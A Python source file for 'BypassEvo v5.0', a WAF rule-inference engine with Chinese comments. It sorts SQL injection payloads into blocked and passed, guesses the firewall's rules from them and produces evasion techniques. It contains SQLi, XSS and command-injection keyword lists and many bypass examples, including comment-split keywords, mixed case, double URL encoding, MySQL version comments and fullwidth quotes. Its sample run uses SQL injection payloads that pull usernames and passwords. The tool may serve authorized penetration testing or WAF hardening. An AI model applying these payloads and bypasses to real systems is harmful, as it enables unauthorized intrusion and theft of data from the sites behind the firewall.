"""
BypassEvo v5.0 — Advanced Rule Inference Engine

纯规则引擎的 WAF 规则推理系统，无需 LLM：
  1. 多维度模式识别（关键词、语法结构、编码特征）
  2. 规则推理（反向工程 WAF 规则逻辑）
  3. 绕过策略生成（基于规则弱点的针对性建议）
  4. 自适应学习（从历史数据中学习 WAF 行为模式）

结合了：
  - 确定性规则匹配（快速、可预测）
  - 统计模式识别（从数据中学习）
  - 语义分析（理解 SQL/XSS/CMDi 语法）
  - 规则推理引擎（推断 WAF 规则逻辑）
"""

import re
import json
import time
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Tuple, Set
from collections import defaultdict, Counter
from difflib import SequenceMatcher


# ═══════════════════════════════════════════════════════════════════════════
# 数据结构定义
# ═══════════════════════════════════════════════════════════════════════════

@dataclass
class WAFRule:
    """推理出的 WAF 规则"""
    rule_id: str                          # 规则唯一标识
    rule_type: str                        # keyword | regex | semantic | encoding | behavioral
    trigger_pattern: str                  # 触发模式
    trigger_keywords: List[str]           # 触发关键词列表
    confidence: float                     # 置信度 0.0-1.0
    
    # 规则特性
    case_sensitive: bool = False          # 是否大小写敏感
    encoding_aware: bool = False          # 是否编码感知
    context_aware: bool = False           # 是否上下文感知
    semantic_analysis: bool = False       # 是否使用语义分析
    
    # 推理证据
    evidence: str = ""                    # 推理依据
    matched_payloads: List[str] = field(default_factory=list)  # 匹配的 payload 示例
    passed_payloads: List[str] = field(default_factory=list)   # 通过的 payload 示例
    
    # 绕过策略
    suggested_bypasses: List[Dict] = field(default_factory=list)
    
    # 元数据
    occurrences: int = 0                  # 出现次数
    first_seen: float = 0                 # 首次出现时间
    last_seen: float = 0                  # 最后出现时间


@dataclass
class PayloadPattern:
    """Payload 模式特征"""
    payload: str
    
    # 结构特征
    has_quotes: bool = False
    has_union: bool = False
    has_select: bool = False
    has_where: bool = False
    has_and_or: bool = False
    has_comments: bool = False
    has_encoding: bool = False
    has_functions: bool = False
    
    # 编码特征
    encoding_types: List[str] = field(default_factory=list)
    
    # 语法特征
    sql_keywords: List[str] = field(default_factory=list)
    sql_functions: List[str] = field(default_factory=list)
    operators: List[str] = field(default_factory=list)
    
    # 复杂度
    length: int = 0
    complexity_score: float = 0.0


@dataclass
class RuleInferenceResult:
    """规则推理结果"""
    rules: List[WAFRule]
    waf_behavior_model: Dict              # WAF 行为模型
    bypass_strategies: List[Dict]         # 绕过策略
    confidence: float                     # 整体置信度
    analysis_summary: str                 # 分析摘要


# ═══════════════════════════════════════════════════════════════════════════
# SQL/XSS/CMDi 语法知识库
# ═══════════════════════════════════════════════════════════════════════════

SQL_KEYWORDS = {
    # 高危关键词（通常被严格拦截）
    "high_risk": [
        "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "ALTER",
        "EXEC", "EXECUTE", "XP_CMDSHELL", "LOAD_FILE", "INTO OUTFILE",
        "INTO DUMPFILE", "INFORMATION_SCHEMA", "BENCHMARK", "SLEEP",
    ],
    # 中危关键词（部分拦截）
    "medium_risk": [
        "OR", "AND", "WHERE", "FROM", "HAVING", "GROUP BY", "ORDER BY",
        "LIMIT", "OFFSET", "JOIN", "INNER", "OUTER", "LEFT", "RIGHT",
        "CONCAT", "SUBSTRING", "CHAR", "ASCII", "HEX", "UNHEX",
    ],
    # 低危关键词（较少拦截）
    "low_risk": [
        "AS", "ON", "IN", "NOT", "NULL", "TRUE", "FALSE", "IS", "LIKE",
        "BETWEEN", "EXISTS", "CASE", "WHEN", "THEN", "ELSE", "END",
    ],
}

SQL_FUNCTIONS = {
    # 数据提取函数
    "extraction": [
        "EXTRACTVALUE", "UPDATEXML", "FLOOR", "RAND", "EXP",
        "CONCAT_WS", "GROUP_CONCAT", "STRING_AGG",
    ],
    # 字符串函数
    "string": [
        "CONCAT", "SUBSTRING", "SUBSTR", "LEFT", "RIGHT", "MID",
        "CHAR", "ASCII", "ORD", "HEX", "UNHEX", "REVERSE",
    ],
    # 时间函数
    "timing": [
        "SLEEP", "BENCHMARK", "WAITFOR", "DELAY", "PG_SLEEP",
    ],
    # 系统函数
    "system": [
        "DATABASE", "USER", "VERSION", "@@VERSION", "@@DATADIR",
        "@@HOSTNAME", "SCHEMA", "CURRENT_USER",
    ],
}

# XSS 关键词
XSS_KEYWORDS = {
    "tags": ["SCRIPT", "IMG", "SVG", "IFRAME", "OBJECT", "EMBED", "BODY", "META"],
    "events": ["ONLOAD", "ONERROR", "ONCLICK", "ONMOUSEOVER", "ONFOCUS", "ONBLUR"],
    "protocols": ["JAVASCRIPT:", "DATA:", "VBSCRIPT:"],
    "attributes": ["SRC", "HREF", "ACTION", "FORMACTION", "XLINK:HREF"],
}

# CMDi 关键词
CMDI_KEYWORDS = {
    "separators": [";", "|", "&&", "||", "&", "$(", "`"],
    "commands": ["ID", "WHOAMI", "UNAME", "CAT", "LS", "PWD", "SLEEP", "PING"],
    "substitution": ["$(", "`", "${", "%0a", "%0d"],
}

# 编码类型
ENCODING_PATTERNS = {
    "url": r"%[0-9a-fA-F]{2}",
    "double_url": r"%25[0-9a-fA-F]{2}",
    "html_entity": r"&#\d+;|&#x[0-9a-fA-F]+;",
    "hex": r"0x[0-9a-fA-F]+",
    "unicode": r"\\u[0-9a-fA-F]{4}|%u[0-9a-fA-F]{4}",
    "base64": r"(?:[A-Za-z0-9+/]{4}){2,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?",
    "fullwidth": r"[Ａ-Ｚａ-ｚ０-９]",
    "overlong_utf8": r"[\xc0-\xc1][\x80-\xbf]",
    "comment": r"/\*.*?\*/|--\s|#", 
}


# ═══════════════════════════════════════════════════════════════════════════
# 核心推理引擎
# ═══════════════════════════════════════════════════════════════════════════

class RuleInferenceEngine:
    """高级规则推理引擎 - 无需 LLM 即可推理 WAF 规则"""
    
    def __init__(self):
        self.known_rules: Dict[str, WAFRule] = {}
        self.payload_history: List[Dict] = []
        self.response_fingerprints: Dict[str, int] = defaultdict(int)
        
    def infer_rules_from_responses(
        self,
        blocked_responses: List[Dict],
        passed_responses: List[Dict] = None,
        waf_name: str = "unknown",
    ) -> RuleInferenceResult:
        """从响应数据中推理 WAF 规则
        
        Args:
            blocked_responses: 被拦截的响应列表
                [{"payload": "...", "status_code": 403, "response_body": "...", "response_time": 0.5}, ...]
            passed_responses: 通过的响应列表（用于对比）
            waf_name: WAF 名称（如果已知）
            
        Returns:
            RuleInferenceResult 包含推理出的规则和绕过策略
        """
        passed_responses = passed_responses or []
        
        # Step 1: 提取 payload 特征
        blocked_patterns = [self._extract_pattern(r["payload"]) for r in blocked_responses]
        passed_patterns = [self._extract_pattern(r["payload"]) for r in passed_responses]
        
        # Step 2: 统计分析 - 找出被拦截 payload 的共同特征
        blocked_features = self._aggregate_features(blocked_patterns)
        passed_features = self._aggregate_features(passed_patterns)
        
        # Step 3: 差异分析 - 哪些特征只在被拦截中出现？
        discriminative_features = self._find_discriminative_features(
            blocked_features, passed_features
        )
        
        # Step 4: 规则推理 - 根据差异特征推理 WAF 规则
        rules = self._infer_rules_from_features(
            discriminative_features, 
            blocked_patterns, 
            passed_patterns,
            waf_name
        )
        
        # Step 5: 构建 WAF 行为模型
        waf_model = self._build_waf_model(
            blocked_features, passed_features, rules
        )
        
        # Step 6: 生成绕过策略
        bypass_strategies = self._generate_bypass_strategies(rules, waf_model)
        
        # Step 7: 生成分析摘要
        summary = self._generate_summary(rules, waf_model)
        
        return RuleInferenceResult(
            rules=rules,
            waf_behavior_model=waf_model,
            bypass_strategies=bypass_strategies,
            confidence=self._calculate_confidence(rules, len(blocked_responses)),
            analysis_summary=summary,
        )
    
    # ── Step 1: 特征提取 ───────────────────────────────────────────────
    
    def _extract_pattern(self, payload: str) -> PayloadPattern:
        """从 payload 中提取结构化特征"""
        pattern = PayloadPattern(payload=payload)
        pattern.length = len(payload)
        
        payload_upper = payload.upper()
        
        # SQL 关键词检测
        for risk_level, keywords in SQL_KEYWORDS.items():
            for kw in keywords:
                if kw in payload_upper:
                    pattern.sql_keywords.append(kw)
                    if kw in ("UNION", "SELECT"):
                        pattern.has_union = True
                        pattern.has_select = True
        
        # SQL 函数检测
        for func_type, functions in SQL_FUNCTIONS.items():
            for func in functions:
                if func in payload_upper:
                    pattern.sql_functions.append(func)
                    pattern.has_functions = True
        
        # 操作符检测
        if re.search(r'\bOR\b', payload_upper) or re.search(r'\bAND\b', payload_upper):
            pattern.has_and_or = True
            pattern.operators.extend(re.findall(r'\b(?:OR|AND)\b', payload_upper))
        
        # 引号检测
        if "'" in payload or '"' in payload or "`" in payload:
            pattern.has_quotes = True
        
        # 注释检测
        if "/*" in payload or "--" in payload or "#" in payload:
            pattern.has_comments = True
        
        # 编码检测
        for enc_type, enc_pattern in ENCODING_PATTERNS.items():
            if re.search(enc_pattern, payload, re.IGNORECASE):
                pattern.encoding_types.append(enc_type)
                pattern.has_encoding = True
        
        # 复杂度评分
        pattern.complexity_score = self._calculate_complexity(pattern)
        
        return pattern
    
    def _calculate_complexity(self, pattern: PayloadPattern) -> float:
        """计算 payload 复杂度"""
        score = 0.0
        
        # 长度贡献
        score += min(pattern.length / 50.0, 1.0) * 0.2
        
        # 关键词贡献
        score += len(pattern.sql_keywords) * 0.1
        
        # 函数贡献
        score += len(pattern.sql_functions) * 0.15
        
        # 编码贡献
        score += len(pattern.encoding_types) * 0.1
        
        # 结构贡献
        if pattern.has_union:
            score += 0.15
        if pattern.has_and_or:
            score += 0.1
        if pattern.has_comments:
            score += 0.1
        if pattern.has_encoding:
            score += 0.1
        
        return min(score, 1.0)
    
    # ── Step 2: 特征聚合 ───────────────────────────────────────────────
    
    def _aggregate_features(self, patterns: List[PayloadPattern]) -> Dict:
        """聚合特征统计"""
        agg = {
            "keywords": Counter(),
            "functions": Counter(),
            "operators": Counter(),
            "encoding_types": Counter(),
            "has_quotes": 0,
            "has_union": 0,
            "has_comments": 0,
            "has_encoding": 0,
            "avg_length": 0,
            "avg_complexity": 0,
        }
        
        if not patterns:
            return agg
        
        for p in patterns:
            agg["keywords"].update(p.sql_keywords)
            agg["functions"].update(p.sql_functions)
            agg["operators"].update(p.operators)
            agg["encoding_types"].update(p.encoding_types)
            
            if p.has_quotes:
                agg["has_quotes"] += 1
            if p.has_union:
                agg["has_union"] += 1
            if p.has_comments:
                agg["has_comments"] += 1
            if p.has_encoding:
                agg["has_encoding"] += 1
            
            agg["avg_length"] += p.length
            agg["avg_complexity"] += p.complexity_score
        
        n = len(patterns)
        agg["avg_length"] /= n
        agg["avg_complexity"] /= n
        
        return agg
    
    # ── Step 3: 差异分析 ───────────────────────────────────────────────
    
    def _find_discriminative_features(
        self, 
        blocked_features: Dict, 
        passed_features: Dict
    ) -> Dict:
        """找出区分性特征（只在被拦截中出现或频率显著不同）"""
        discriminative = {
            "keywords": {},
            "functions": {},
            "operators": {},
            "encoding_types": {},
            "structural": [],
        }
        
        # 关键词差异
        blocked_kw = blocked_features["keywords"]
        passed_kw = passed_features["keywords"]
        
        for kw, count in blocked_kw.items():
            blocked_freq = count / max(sum(blocked_kw.values()), 1)
            passed_freq = passed_kw.get(kw, 0) / max(sum(passed_kw.values()), 1)
            
            # 如果关键词在被拦截中频率显著高于通过的
            if blocked_freq > passed_freq * 1.5 or passed_freq == 0:
                discriminative["keywords"][kw] = {
                    "blocked_count": count,
                    "passed_count": passed_kw.get(kw, 0),
                    "discrimination_ratio": blocked_freq / max(passed_freq, 0.01),
                }
        
        # 函数差异
        blocked_func = blocked_features["functions"]
        passed_func = passed_features["functions"]
        
        for func, count in blocked_func.items():
            passed_count = passed_func.get(func, 0)
            if count > passed_count * 2:
                discriminative["functions"][func] = {
                    "blocked_count": count,
                    "passed_count": passed_count,
                }
        
        # 编码差异
        blocked_enc = blocked_features["encoding_types"]
        passed_enc = passed_features["encoding_types"]
        
        for enc, count in blocked_enc.items():
            passed_count = passed_enc.get(enc, 0)
            # 如果某种编码只在被拦截中出现
            if count > 0 and passed_count == 0:
                discriminative["encoding_types"][enc] = {
                    "blocked_count": count,
                    "passed_count": passed_count,
                }
        
        # 结构特征差异
        total_blocked = sum(blocked_kw.values()) or 1
        total_passed = sum(passed_kw.values()) or 1
        
        if blocked_features["has_union"] / total_blocked > passed_features["has_union"] / total_passed * 1.5:
            discriminative["structural"].append({
                "feature": "UNION keyword",
                "evidence": "UNION appears more frequently in blocked payloads",
            })
        
        if blocked_features["has_comments"] / total_blocked > passed_features["has_comments"] / total_passed * 1.5:
            discriminative["structural"].append({
                "feature": "SQL comments",
                "evidence": "Comments appear more frequently in blocked payloads",
            })
        
        return discriminative
    
    # ── Step 4: 规则推理 ───────────────────────────────────────────────
    
    def _infer_rules_from_features(
        self,
        discriminative_features: Dict,
        blocked_patterns: List[PayloadPattern],
        passed_patterns: List[PayloadPattern],
        waf_name: str,
    ) -> List[WAFRule]:
        """根据差异特征推理 WAF 规则"""
        rules = []
        rule_id_base = f"{waf_name}_{int(time.time())}"
        
        # 规则 1: 关键词拦截规则
        if discriminative_features["keywords"]:
            for kw, data in sorted(
                discriminative_features["keywords"].items(),
                key=lambda x: x[1]["discrimination_ratio"],
                reverse=True
            )[:5]:  # Top 5 关键词
                rule = WAFRule(
                    rule_id=f"{rule_id_base}_kw_{kw.lower()}",
                    rule_type="keyword",
                    trigger_pattern=f"\\b{kw}\\b",
                    trigger_keywords=[kw],
                    confidence=min(0.9, data["discrimination_ratio"] * 0.4),
                    case_sensitive=self._detect_case_sensitivity(kw, blocked_patterns, passed_patterns),
                    evidence=f"Keyword '{kw}' appears in {data['blocked_count']} blocked payloads "
                            f"but only {data['passed_count']} passed payloads "
                            f"(discrimination ratio: {data['discrimination_ratio']:.2f})",
                )
                
                # 推荐绕过策略
                rule.suggested_bypasses = self._generate_keyword_bypasses(kw, rule.case_sensitive)
                rules.append(rule)
        
        # 规则 2: 函数拦截规则
        if discriminative_features["functions"]:
            for func, data in list(discriminative_features["functions"].items())[:3]:
                rule = WAFRule(
                    rule_id=f"{rule_id_base}_func_{func.lower()}",
                    rule_type="keyword",
                    trigger_pattern=f"\\b{func}\\s*\\(",
                    trigger_keywords=[func],
                    confidence=0.85,
                    evidence=f"Function '{func}()' appears in {data['blocked_count']} blocked payloads",
                )
                rule.suggested_bypasses = self._generate_function_bypasses(func)
                rules.append(rule)
        
        # 规则 3: 编码感知规则
        if discriminative_features["encoding_types"]:
            for enc, data in discriminative_features["encoding_types"].items():
                rule = WAFRule(
                    rule_id=f"{rule_id_base}_enc_{enc}",
                    rule_type="encoding",
                    trigger_pattern=ENCODING_PATTERNS.get(enc, ""),
                    trigger_keywords=[enc],
                    encoding_aware=True,
                    confidence=0.75,
                    evidence=f"Encoding type '{enc}' detected and blocked ({data['blocked_count']} times)",
                )
                rule.suggested_bypasses = self._generate_encoding_bypasses(enc)
                rules.append(rule)
        
        # 规则 4: 语义规则（检测 UNION SELECT 组合）
        union_keywords = ["UNION", "SELECT"]
        union_blocked = sum(1 for p in blocked_patterns if "UNION" in p.sql_keywords and "SELECT" in p.sql_keywords)
        union_passed = sum(1 for p in passed_patterns if "UNION" in p.sql_keywords and "SELECT" in p.sql_keywords)
        
        if union_blocked > union_passed * 2:
            rule = WAFRule(
                rule_id=f"{rule_id_base}_semantic_union",
                rule_type="semantic",
                trigger_pattern="\\bUNION\\s+(?:ALL\\s+)?SELECT\\b",
                trigger_keywords=["UNION", "SELECT"],
                semantic_analysis=True,
                confidence=0.88,
                evidence=f"UNION SELECT combination blocked {union_blocked} times, passed {union_passed} times",
            )
            rule.suggested_bypasses = [
                {"technique": "comment_split", "example": "UN/**/ION SEL/**/ECT", "reasoning": "Split keywords with comments"},
                {"technique": "case_variation", "example": "UnIoN SeLeCt", "reasoning": "Mix case to bypass pattern"},
                {"technique": "whitespace", "example": "UNION%0ASELECT", "reasoning": "Use newline instead of space"},
                {"technique": "inline_comment", "example": "/*!50000UNION*/ /*!50000SELECT*/", "reasoning": "MySQL version comment"},
            ]
            rules.append(rule)
        
        # 规则 5: 引号拦截规则
        quotes_blocked = sum(1 for p in blocked_patterns if p.has_quotes)
        quotes_passed = sum(1 for p in passed_patterns if p.has_quotes)
        
        if quotes_blocked > quotes_passed * 1.5:
            rule = WAFRule(
                rule_id=f"{rule_id_base}_quote",
                rule_type="keyword",
                trigger_pattern="['\"`]",
                trigger_keywords=["quote"],
                confidence=0.80,
                evidence=f"Quotes appear in {quotes_blocked} blocked payloads vs {quotes_passed} passed",
            )
            rule.suggested_bypasses = [
                {"technique": "hex_encoding", "example": "0x27", "reasoning": "Use hex for single quote"},
                {"technique": "char_function", "example": "CHAR(39)", "reasoning": "Build quote from CHAR()"},
                {"technique": "unicode_quote", "example": "%ef%bc%87", "reasoning": "Fullwidth apostrophe (U+FF07)"},
                {"technique": "double_encoding", "example": "%2527", "reasoning": "Double URL encoding"},
            ]
            rules.append(rule)
        
        return rules
    
    # ── Step 5: WAF 行为模型构建 ───────────────────────────────────────
    
    def _build_waf_model(
        self,
        blocked_features: Dict,
        passed_features: Dict,
        rules: List[WAFRule]
    ) -> Dict:
        """构建 WAF 行为模型"""
        model = {
            "sophistication": "unknown",  # basic | intermediate | advanced
            "capabilities": [],
            "weaknesses": [],
            "detection_methods": set(),
        }
        
        # 判断 WAF 复杂度
        if any(r.encoding_aware for r in rules):
            model["capabilities"].append("encoding_detection")
            model["detection_methods"].add("encoding_aware")
        
        if any(r.semantic_analysis for r in rules):
            model["capabilities"].append("semantic_analysis")
            model["detection_methods"].add("semantic")
        
        if any(r.case_sensitive for r in rules):
            model["capabilities"].append("case_sensitive_matching")
        else:
            model["weaknesses"].append("case_insensitive_can_be_bypassed_with_mixed_case")
        
        # 判断整体复杂度
        capability_count = len(model["capabilities"])
        if capability_count >= 3:
            model["sophistication"] = "advanced"
        elif capability_count >= 1:
            model["sophistication"] = "intermediate"
        else:
            model["sophistication"] = "basic"
        
        # 识别弱点
        if not any(r.encoding_aware for r in rules):
            model["weaknesses"].append("encoding_not_detected")
        
        if not any(r.context_aware for r in rules):
            model["weaknesses"].append("context_not_tracked")
        
        model["detection_methods"] = list(model["detection_methods"])
        
        return model
    
    # ── Step 6: 绕过策略生成 ───────────────────────────────────────────
    
    def _generate_bypass_strategies(
        self, 
        rules: List[WAFRule], 
        waf_model: Dict
    ) -> List[Dict]:
        """生成综合绕过策略"""
        strategies = []
        
        # 基于规则的策略
        for rule in rules:
            for bypass in rule.suggested_bypasses:
                strategies.append({
                    "target_rule": rule.rule_id,
                    "rule_type": rule.rule_type,
                    **bypass,
                })
        
        # 基于 WAF 模型的策略
        if "encoding_not_detected" in waf_model.get("weaknesses", []):
            strategies.append({
                "target_rule": "encoding_weakness",
                "technique": "encoding_chain",
                "example": "%2527 → %27 → '",
                "reasoning": "WAF does not detect encoded payloads",
            })
        
        if "case_insensitive_can_be_bypassed_with_mixed_case" in waf_model.get("weaknesses", []):
            strategies.append({
                "target_rule": "case_weakness",
                "technique": "case_variation",
                "example": "SeLeCt FrOm",
                "reasoning": "WAF is case-insensitive, use mixed case",
            })
        
        return strategies
    
    # ── 辅助方法 ───────────────────────────────────────────────────────
    
    def _detect_case_sensitivity(
        self, 
        keyword: str, 
        blocked_patterns: List[PayloadPattern], 
        passed_patterns: List[PayloadPattern]
    ) -> bool:
        """检测 WAF 是否大小写敏感"""
        # 检查是否有小写版本通过但大写被拦截
        keyword_lower = keyword.lower()
        keyword_upper = keyword.upper()
        
        lower_passed = any(keyword_lower in p.payload.lower() for p in passed_patterns)
        upper_blocked = any(keyword_upper in p.payload.upper() for p in blocked_patterns)
        
        # 如果小写通过但大写被拦截，说明大小写敏感
        return lower_passed and upper_blocked
    
    def _generate_keyword_bypasses(self, keyword: str, case_sensitive: bool) -> List[Dict]:
        """生成关键词绕过策略"""
        bypasses = []
        
        if not case_sensitive:
            bypasses.append({
                "technique": "case_variation",
                "example": self._mixed_case(keyword),
                "reasoning": "WAF is case-insensitive, try mixed case",
            })
        
        bypasses.extend([
            {
                "technique": "comment_split",
                "example": f"{keyword[:2]}/**/{keyword[2:]}",
                "reasoning": "Split keyword with SQL comment",
            },
            {
                "technique": "url_encoding",
                "example": "".join(f"%{ord(c):02X}" for c in keyword[:3]) + keyword[3:],
                "reasoning": "Partially URL encode the keyword",
            },
            {
                "technique": "double_encoding",
                "example": "".join(f"%25{ord(c):02X}" for c in keyword[:2]) + keyword[2:],
                "reasoning": "Double URL encode part of the keyword",
            },
            {
                "technique": "inline_comment_mysql",
                "example": f"/*!50000{keyword}*/",
                "reasoning": "MySQL version comment (if MySQL backend)",
            },
        ])
        
        return bypasses
    
    def _generate_function_bypasses(self, func: str) -> List[Dict]:
        """生成函数绕过策略"""
        return [
            {
                "technique": "case_variation",
                "example": self._mixed_case(func),
                "reasoning": "Mix case in function name",
            },
            {
                "technique": "comment_inside",
                "example": f"{func[:3]}/**/{func[3:]}(",
                "reasoning": "Insert comment inside function name",
            },
            {
                "technique": "whitespace",
                "example": f"{func}%0a(",
                "reasoning": "Use newline before parenthesis",
            },
            {
                "technique": "alternative_function",
                "example": self._get_alternative_function(func),
                "reasoning": "Use equivalent alternative function",
            },
        ]
    
    def _generate_encoding_bypasses(self, enc_type: str) -> List[Dict]:
        """生成编码绕过策略"""
        bypasses = []
        
        if enc_type == "url":
            bypasses.append({
                "technique": "double_url_encoding",
                "example": "%2527 instead of %27",
                "reasoning": "WAF detects single URL encoding, try double",
            })
        elif enc_type == "html_entity":
            bypasses.append({
                "technique": "mixed_encoding",
                "example": "&#39; + %27",
                "reasoning": "Mix HTML entity with URL encoding",
            })
        
        bypasses.extend([
            {
                "technique": "unicode_alternative",
                "example": "%ef%bc%87 (fullwidth apostrophe)",
                "reasoning": "Use Unicode alternative characters",
            },
            {
                "technique": "overlong_utf8",
                "example": "\\xC0\\xAE for dot (overlong encoding)",
                "reasoning": "Overlong UTF-8 encoding may bypass decoder",
            },
        ])
        
        return bypasses
    
    def _mixed_case(self, s: str) -> str:
        """生成混合大小写"""
        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))
    
    def _get_alternative_function(self, func: str) -> str:
        """获取替代函数"""
        alternatives = {
            "CONCAT": "CONCAT_WS",
            "SUBSTRING": "SUBSTR",
            "SLEEP": "BENCHMARK",
            "EXTRACTVALUE": "UPDATEXML",
            "ASCII": "ORD",
            "CHAR": "CONCAT",
        }
        return alternatives.get(func.upper(), func)
    
    def _calculate_confidence(self, rules: List[WAFRule], sample_size: int) -> float:
        """计算整体置信度"""
        if not rules:
            return 0.0
        
        # 基于样本数量和规则置信度
        sample_factor = min(sample_size / 20.0, 1.0)
        avg_rule_conf = sum(r.confidence for r in rules) / len(rules)
        
        return (sample_factor * 0.4 + avg_rule_conf * 0.6)
    
    def _generate_summary(self, rules: List[WAFRule], waf_model: Dict) -> str:
        """生成分析摘要"""
        if not rules:
            return "No clear WAF rules identified from the provided data."
        
        summary_parts = [
            f"Identified {len(rules)} WAF rules.",
            f"WAF sophistication: {waf_model['sophistication']}.",
        ]
        
        rule_types = Counter(r.rule_type for r in rules)
        for rule_type, count in rule_types.items():
            summary_parts.append(f"{count} {rule_type} rules.")
        
        if waf_model.get("weaknesses"):
            summary_parts.append(f"Weaknesses detected: {', '.join(waf_model['weaknesses'][:3])}.")
        
        return " ".join(summary_parts)


# ═══════════════════════════════════════════════════════════════════════════
# 便捷接口
# ═══════════════════════════════════════════════════════════════════════════

def infer_waf_rules(
    blocked_payloads: List[str],
    passed_payloads: List[str] = None,
    waf_name: str = "unknown",
) -> RuleInferenceResult:
    """便捷函数：从 payload 列表推理 WAF 规则
    
    Args:
        blocked_payloads: 被拦截的 payload 列表
        passed_payloads: 通过的 payload 列表
        waf_name: WAF 名称
        
    Returns:
        RuleInferenceResult
    """
    engine = RuleInferenceEngine()
    
    blocked_responses = [{"payload": p, "status_code": 403} for p in blocked_payloads]
    passed_responses = [{"payload": p, "status_code": 200} for p in (passed_payloads or [])]
    
    return engine.infer_rules_from_responses(
        blocked_responses, passed_responses, waf_name
    )


# ═══════════════════════════════════════════════════════════════════════════
# 示例用法
# ═══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    # 示例：推理 WAF 规则
    blocked = [
        "' UNION SELECT database(),version()--",
        "' UNION SELECT NULL,NULL--",
        "' UNION ALL SELECT user(),@@version--",
        "1' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT username,password FROM users--",
    ]
    
    passed = [
        "' OR 1=1--",
        "' AND 1=1--",
        "1' AND SLEEP(3)--",
        "admin'--",
    ]
    
    result = infer_waf_rules(blocked, passed, "UnknownWAF")
    
    print(f"Analysis Summary: {result.analysis_summary}")
    print(f"\nInferred {len(result.rules)} rules:")
    
    for i, rule in enumerate(result.rules, 1):
        print(f"\n{i}. Rule ID: {rule.rule_id}")
        print(f"   Type: {rule.rule_type}")
        print(f"   Pattern: {rule.trigger_pattern}")
        print(f"   Confidence: {rule.confidence:.2f}")
        print(f"   Evidence: {rule.evidence}")
        print(f"   Suggested Bypasses: {len(rule.suggested_bypasses)}")
        for bypass in rule.suggested_bypasses[:2]:
            print(f"     - {bypass['technique']}: {bypass['example']}")
